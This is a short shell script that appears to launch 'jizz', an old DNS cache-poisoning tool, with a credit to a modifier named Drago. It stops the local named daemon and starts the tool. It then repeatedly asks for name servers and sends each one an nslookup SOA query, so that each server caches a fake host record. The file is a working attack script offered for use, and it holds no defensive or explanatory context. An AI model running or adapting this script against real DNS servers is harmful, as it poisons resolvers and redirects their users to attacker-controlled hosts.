#!/bin/sh
# launch jizz
#Modified by Drago for multiple ns caching.
#Drago@Drago.com
if [ $# != 6 ]; then echo 'Incorrect Usage.';./jizz;exit 0;fi
killall -9 jizz
killall -9 named
./jizz $1 $2 $3 $4 $5 $6&
sleep 5
while [ "$host" != "." ];do echo -n -e 'Name Server To Cache Fake Host On:';
read host;
if [ "$host" = "." ]; then echo Killing myself and starting named back up.;
killall -9 jizz ; /usr/sbin/named; exit 0;fi
echo -e "server $host\nset type=soa\n$1\nexit\n" |nslookup;done